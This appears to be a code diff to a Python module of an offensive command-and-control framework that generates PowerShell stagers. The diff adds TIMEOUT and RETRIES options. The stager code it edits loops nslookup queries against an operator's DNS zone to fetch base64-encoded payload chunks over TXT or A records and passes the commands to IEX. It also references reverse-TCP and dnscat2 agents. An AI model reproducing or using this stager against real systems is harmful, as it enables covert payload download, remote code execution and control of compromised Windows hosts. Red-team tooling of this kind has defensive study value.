@@ -3,6 +3,7 @@ from syhelpers.log import *
 import syhelpers.strings as helps
 import syhelpers.encoding as encryption
 import syhelpers.tls
+from syhelpers.types import isint
 from syplatform.platform import Platform
 from syhelpers.modulebase import ModuleBase
 import os.path
@@ -62,6 +63,16 @@ class PlatformPowershell(Platform, ModuleBase):
                 'Value'         :   "DEFAULT",
                 'Options'       :   ("DEFAULT", "DNSCAT2", "DNSCAT2DOWNLOADER")
             },
+            'TIMEOUT': {
+                'Description'   :   'Number of seconds to wait for each request (currently only supported by DNS TXT)',
+                'Required'      :   True,
+                'Value'         :   9
+            },
+            'RETRIES': {
+                'Description'   :   'Retry each request for this number of times (currently only supported by DNS TXT)',
+                'Required'      :   True,
+                'Value'         :   2
+            },
         }
         self.handler = handler
         self.platformpath = os.path.abspath(os.path.dirname(__file__))
@@ -85,6 +96,13 @@ class PlatformPowershell(Platform, ModuleBase):
                 self.fingerprint = None
                 self.certificate = None
                 self.publickeyxml = None
+
+        if name.upper() == "TIMEOUT" and (not isint(value) or int(value) < 1 or int(value) > 100):
+            print_error("TIMEOUT should be 1 <= TIMEOUT <= 100")
+            return True  # value found, but not set
+        if name.upper() == "RETRIES" and (not isint(value) or int(value) < 0 or int(value) > 100):
+            print_error("RETRIES should be 0 <= RETRIES <= 100")
+            return True  # value found, but not set
 
         return ModuleBase.setoption(self, name, value)
 
@@ -188,10 +206,20 @@ class PlatformPowershell(Platform, ModuleBase):
                     self.options['STAGECERTIFICATEFILE']['Value']):
                 valid = False
 
-        if (self.options['AGENTTYPE']['Value'] == "DNSCAT2" \
+        if (self.options['AGENTTYPE']['Value'] == "DNSCAT2"
                 or self.options['AGENTTYPE']['Value'] == "DNSCAT2DOWNLOADER") \
                 and self.handler.options['TRANSPORT']['Value'] != "DNS":
             print_error("dnscat2 must be used with DNS transport, hence the name!")
+            valid = False
+
+        timeout = self.options['TIMEOUT']['Value']
+        if not isint(timeout) or int(timeout) < 1 or int(timeout) > 100:
+            print_error("TIMEOUT should be 1 <= TIMEOUT <= 100")
+            valid = False
+
+        retries = self.options['RETRIES']['Value']
+        if not isint(retries) or int(retries) < 0 or int(retries) > 100:
+            print_error("RETRIES should be 0 <= RETRIES <= 100")
             valid = False
 
         return valid
@@ -217,6 +245,7 @@ class PlatformPowershell(Platform, ModuleBase):
 
         # generate powershell + reversetcp stager
         if self.handler.options['TRANSPORT']['Value'] == "REVERSETCP":
+            #TODO: implement TIMEOUT and RETRIES
             ip = self.handler.transport.options['CONNECTHOST']['Value'] \
                  or self.handler.transport.options['LHOST']['Value']
             if ip == "0.0.0.0":
@@ -238,6 +267,8 @@ class PlatformPowershell(Platform, ModuleBase):
             zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
             server = self.handler.transport.options['DNSSERVER']['Value']
             dnstype = self.handler.transport.options['DNSTYPE']['Value']
+            timeout = self.options['TIMEOUT']['Value']
+            retries = self.options['RETRIES']['Value']
             print_debug(DEBUG_MODULE, "zone = {}, server = {}, dnstype = {}".format(zone, server, dnstype))
             if server is None:
                 server = ""
@@ -245,13 +276,18 @@ class PlatformPowershell(Platform, ModuleBase):
             # TODO: Consider using helps.randomize_capitalization(...)
             stager = '$r=Get-Random;'
             if dnstype == "TXT":
-                stager += '$a="";for($i=0;;$i++){'
-                stager += '$c=([string](IEX "nslookup -type=TXT -timeout=9 s$($i)r$($r).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
-                stager += 'if(!$c){break;}$a+=$c;}'
+                # TODO: here TIMEOUT and RETRIES are already implemented, consider adding the special cases for
+                #   TIMEOUT=2 (default in nslookup) and RETRIES=0
+                stager += '$a="";$t=0;for($i=0;;$i++){'
+                stager += '$c=([string](IEX "nslookup -type=TXT -timeout={} s$($i)r$($r).{}. {}")).Split({})[1];'\
+                    .format(timeout, zone, server, "'\"'")
+                stager += 'if(!$c){{if($t++-gt{}){{break;}}$i--;continue;}}$t=0;$a+=$c;}}'.format(retries+1)
                 stager += '$a=[Convert]::FromBase64String($a);'
             elif dnstype == "A":
+                # TODO: implement RETRIES
                 stager += '$a=New-Object char[](0);for($i=0;;$i++){'
-                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A -timeout=9 s$($i)r$($r).{}. {}"));'.format(zone, server)
+                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A -timeout={} s$($i)r$($r).{}. {}"));'\
+                    .format(timeout, zone, server)
                 stager += 'if($c.Length-lt7-or$c.Length-gt11){break;}$a+=$c[-2].Split(".")}'
                 stager += '$a=$a|%{[Convert]::ToInt32($_)};'
             else:
